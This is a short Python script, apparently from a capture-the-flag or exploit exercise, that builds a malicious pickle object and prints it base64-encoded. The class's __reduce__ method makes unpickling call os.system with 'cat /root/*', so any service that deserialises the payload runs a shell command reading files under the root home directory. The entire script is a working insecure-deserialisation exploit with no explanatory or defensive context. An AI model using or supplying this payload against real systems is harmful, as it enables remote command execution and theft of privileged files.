import pickle
import os
import base64

class Payload(object):
    def __reduce__(self):
        return (os.system, ('cat /root/*', ))

pickle_data = pickle.dumps(Payload())
print(base64.b64encode(pickle_data))
